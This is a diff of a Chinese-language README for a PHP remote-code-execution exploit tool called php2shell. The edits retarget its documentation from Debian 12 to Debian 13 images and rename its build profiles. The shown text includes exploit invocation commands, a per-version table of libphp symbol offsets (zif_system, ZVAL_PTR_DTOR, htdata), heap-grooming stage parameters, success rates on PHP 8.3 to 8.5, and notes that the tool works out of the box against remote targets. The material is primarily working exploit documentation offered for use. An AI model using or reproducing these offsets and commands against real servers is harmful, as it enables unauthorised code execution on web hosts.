@@ -81,7 +81,7 @@ PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
 git clone https://github.com/3em0/php2shell.git
 cd php2shell
 
-# 1) 拉官方镜像（PHP 8.4.26 / Debian 12 / Apache prefork）
+# 1) 拉官方镜像（PHP 8.4.26 / Debian 13 / Apache prefork）
 docker compose -f docker/docker-compose.yml pull
 
 # 2) 起目标：单 worker、display_errors=On、memory_limit=8M
@@ -105,14 +105,14 @@ python3 exploit.py -u http://127.0.0.1:8088/index.php
 
 ## 复现结果
 
-在官方 PHP `-apache` 镜像（均为 Debian 12 bookworm）、`linux/amd64` 上,用本仓库 `docker/` 靶场把
+在官方 PHP `-apache` 镜像（均为 Debian 13 trixie）、`linux/amd64` 上,用本仓库 `docker/` 靶场把
 `PHP_IMAGE` 指向各版本实测：
 
 | PHP 版本 | Profile | libphp 偏移 | 阶段 1–2 泄漏 | 阶段 3 RCE |
 | --- | --- | --- | --- | --- |
-| **8.3.35** | `bookworm83`（本机自动选） | 自动 `0x3ac080` / `0x49ec50` | 稳定 | ✅ **8 / 8** 一键 |
-| **8.4.26** | `bookworm`（默认） | 自动 `0x465370` / `0x65eb60` | 稳定 | ✅ **3 / 3** 一键 |
-| **8.5.11** | `bookworm`（默认） | 自动 `0x5996e0` / `0x7b47a0` | 稳定 | ✅ **6 / 6** 一键 |
+| **8.3.35** | `official83`（本机自动选） | 自动 `0x3ac080` / `0x49ec50` | 稳定 | ✅ **8 / 8** 一键 |
+| **8.4.26** | `official`（默认） | 自动 `0x465370` / `0x65eb60` | 稳定 | ✅ **3 / 3** 一键 |
+| **8.5.11** | `official`（默认） | 自动 `0x5996e0` / `0x7b47a0` | 稳定 | ✅ **6 / 6** 一键 |
 
 libphp 符号偏移在运行时从各镜像读取,因此只有 chunk 相对的 `htdata` 偏移与版本有关：8.4/8.5 为 `0x690d8`,
 8.3 为 `0x6a0d8`。把靶场指向其他版本：
@@ -167,8 +167,8 @@ php_session_track_init()
 
 | Profile | 目标构建 | `zif_system` | `ZVAL_PTR_DTOR` | `htdata` | stage1 / stage2 |
 | --- | --- | --- | --- | --- | --- |
-| **`bookworm`**（默认） | 官方 `php:8.4`/`8.5-apache`（Debian 12） | `0x465370` | `0x65eb60` | `0x690d8` | `n=841`、`t=406`、`v=16` |
-| `bookworm83` | 官方 `php:8.3-apache`（Debian 12） | `0x3ac080` | `0x49ec50` | `0x6a0d8` | `n=841`、`t=406`、`v=16` |
+| **`official`**（默认） | 官方 `php:8.4`/`8.5-apache`（Debian 13） | `0x465370` | `0x65eb60` | `0x690d8` | `n=841`、`t=406`、`v=16` |
+| `official83` | 官方 `php:8.3-apache`（Debian 13） | `0x3ac080` | `0x49ec50` | `0x6a0d8` | `n=841`、`t=406`、`v=16` |
 | `lab` | 自编译（Apache 2.4.68，最小 PHP） | `0x43a870` | `0x613c50` | `0x6e0d8` | `n=892`、`t=443`、`v=1` |
 
 偏移取值优先级（从高到低）：
@@ -179,12 +179,12 @@ php_session_track_init()
 
 两个便利设计让多版本使用零配置：
 
-- **htdata 随版本自动。** 对本机容器,exp 会读取 PHP 小版本号,在默认 profile 下对 8.3 自动采用 `bookworm83`
+- **htdata 随版本自动。** 对本机容器,exp 会读取 PHP 小版本号,在默认 profile 下对 8.3 自动采用 `official83`
   的 `htdata` —— 因此同一条命令适配 8.3 / 8.4 / 8.5,无需加任何参数。
 - **每个 profile 自带 libphp 默认值。** 因此对相应构建的**远程**目标也能开箱即用,即便 `docker/offsets.py`
   无法运行（它只能访问本机容器）。
 
-用 `--profile bookworm83` / `--profile lab` 切换 profile；用 `--offsets-file '' --no-auto-offsets`
+用 `--profile official83` / `--profile lab` 切换 profile；用 `--offsets-file '' --no-auto-offsets`
 关闭自动读取。
 
 ## 执行任意命令
@@ -203,7 +203,7 @@ python3 exploit.py -u http://127.0.0.1:8088/index.php -c 'sh</out/c'
 | --- | --- | --- |
 | `-u`, `--url` | *(必填)* | 目标 PHP 页面，如 `http://127.0.0.1:8088/index.php` |
 | `-c`, `--cmd` | `id>/out/p1` | 要执行的命令（最多 14 字节） |
-| `--profile` | `bookworm` | 构建 profile：`bookworm`（8.4/8.5）、`bookworm83`（8.3）或 `lab` |
+| `--profile` | `official` | 构建 profile：`official`（8.4/8.5）、`official83`（8.3）或 `lab` |
 | `--proof-file` | `out/p1` | 利用后回读的本机文件（`''` 关闭） |
 | `--fetch` | *(关闭)* | 利用后 `GET` 此路径（用于写入 web 根目录的命令） |
 | `--zif-offset` / `--dtor-offset` / `--htdata-offset` | *(profile)* | 覆盖单个偏移 |
@@ -222,7 +222,7 @@ python3 exploit.py -u http://127.0.0.1:8088/index.php -c 'sh</out/c'
 | 组件 | 取值 |
 | --- | --- |
 | PHP | 8.4.26（NTS，mod_php） |
-| 基础系统 | Debian 12 (bookworm) |
+| 基础系统 | Debian 13 (trixie) |
 | Apache MPM | prefork，**单 worker** |
 | `display_errors` | `On` |
 | `memory_limit` | `8M` |
@@ -261,6 +261,8 @@ php2shell/
   `session.use_cookies=1`、`session.use_strict_mode=0`、单 worker prefork。
 - 稳定 RCE 已在 PHP **8.3 / 8.4 / 8.5**（官方 `-apache` 镜像，`linux/amd64`）上验证。同一小版本的其他点版本
   预期同样可用（libphp 偏移自动读取），但未逐一测试。
+- **不支持 PHP 8.1 / 8.2。** 在当前 `php:8.1-apache`、`php:8.2-apache` 镜像上,阶段 1 的堆泄漏原语在本 grooming
+  下不触发（始终拿不到 chunk 基址）,利用在产生任何泄漏前就停止。支持它们需要为这些版本重新标定阶段 1。
 - `display_errors=0` 下纯 HTTP 堆泄漏可行，但该配置的完整 RCE 未包含在此
   （见 [docs/DISPLAY_ERRORS_OFF.md](docs/DISPLAY_ERRORS_OFF.md)）。
 - 偏移为 x86-64；不同架构或重新编译的 `libphp.so` 会使其漂移（用 `docker/offsets.py` 或 `--*-offset`）。
